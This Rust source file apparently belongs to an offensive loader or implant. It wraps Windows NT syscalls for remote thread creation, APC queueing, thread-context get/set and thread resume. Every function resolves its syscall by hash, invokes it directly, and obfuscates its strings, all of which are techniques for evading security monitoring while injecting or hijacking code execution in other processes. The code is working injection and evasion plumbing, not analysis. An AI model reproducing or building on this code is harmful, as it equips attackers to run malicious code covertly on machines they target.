use crate::syscall;
use crate::ntapi::def::{THREAD_ALL_ACCESS, CURRENT_PROCESS};
use super::types::*;
use core::ffi::c_void;
use obfstr::obfstr;

pub fn create_remote_thread_ex(process_handle: isize, start: usize, arg: usize) -> Result<isize, String> {
    let mut thread_handle: isize = 0;
    let nt_create_hash = crate::dbj2_hash!(b"NtCreateThreadEx");

    let status = syscall!(
        nt_create_hash,
        NtCreateThreadExFn,
        (&mut thread_handle as *mut isize as u64),
        THREAD_ALL_ACCESS as u64,
        core::ptr::null_mut::<c_void>() as u64,
        process_handle as u64,
        (start as *mut c_void) as u64,
        (arg as *mut c_void) as u64,
        0u32 as u64,
        0usize as u64,
        0usize as u64,
        0usize as u64,
        core::ptr::null_mut::<c_void>() as u64,
    );

    match status {
        Some(s) => {
            if s < 0 {
                return Err(format!("{}: {:#x}", obfstr!("NtCreateThreadEx failed"), s));
            }
        }
        None => {
            return Err(obfstr!("Syscall failed").to_string());
        }
    }

    Ok(thread_handle)
}

pub fn create_thread_ex(start: usize, arg: usize) -> Result<isize, String> {
    create_remote_thread_ex(CURRENT_PROCESS, start, arg)
}

pub fn queue_apc_thread(thread_handle: isize, routine: usize) -> Result<(), String> {
    let nt_queue_hash = crate::dbj2_hash!(b"NtQueueApcThread");

    let qstatus = syscall!(
        nt_queue_hash,
        NtQueueApcThreadFn,
        thread_handle,
        routine as *mut c_void,
        core::ptr::null_mut::<c_void>(),
        core::ptr::null_mut::<c_void>(),
        core::ptr::null_mut::<c_void>(),
    )
    .ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if qstatus < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtQueueApcThread failed"), qstatus));
    }

    Ok(())
}

pub fn test_alert() -> Result<(), String> {
    let nt_test_alert_hash = crate::dbj2_hash!(b"NtTestAlert");

    let status = syscall!(
        nt_test_alert_hash,
        NtTestAlertFn,
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtTestAlert failed"), status));
    }
    Ok(())
}

pub fn get_context_thread(thread_handle: isize, context: *mut core::ffi::c_void) -> Result<(), String> {
    let nt_get_context_hash = crate::dbj2_hash!(b"NtGetContextThread");

    let status = syscall!(
        nt_get_context_hash,
        NtGetContextThreadFn,
        thread_handle as u64,
        context as u64
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtGetContextThread failed"), status));
    }
    Ok(())
}

pub fn set_context_thread(thread_handle: isize, context: *const core::ffi::c_void) -> Result<(), String> {
    let nt_set_context_hash = crate::dbj2_hash!(b"NtSetContextThread");

    let status = syscall!(
        nt_set_context_hash,
        NtSetContextThreadFn,
        thread_handle as u64,
        context as u64
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtSetContextThread failed"), status));
    }
    Ok(())
}

pub fn resume_thread(thread_handle: isize) -> Result<u32, String> {
    let nt_resume_hash = crate::dbj2_hash!(b"NtResumeThread");
    let mut suspend_count = 0;

    let status = syscall!(
        nt_resume_hash,
        NtResumeThreadFn,
        thread_handle as u64,
        (&mut suspend_count as *mut u32 as u64)
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtResumeThread failed"), status));
    }
    Ok(suspend_count)
}
